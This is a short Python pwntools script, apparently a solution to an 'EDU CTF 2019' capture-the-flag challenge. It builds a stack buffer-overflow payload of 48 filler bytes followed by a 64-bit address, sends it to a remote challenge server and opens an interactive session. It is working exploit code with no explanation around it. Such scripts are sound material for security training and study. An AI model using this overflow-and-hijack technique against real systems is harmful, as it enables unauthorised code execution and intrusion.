#!/usr/bin/env python
from pwn import *
from IPython import embed

context.arch = 'amd64'

payload = b'a' * 48

payload += pack(0x00000400687, 64, 'little', True)

r = remote('edu-ctf.csie.org', 10170)
# r = remote('127.0.0.1', 8888)
r.recvuntil('Welcome to EDU CTF 2019.')
# pause()
r.send(payload)
r.interactive()


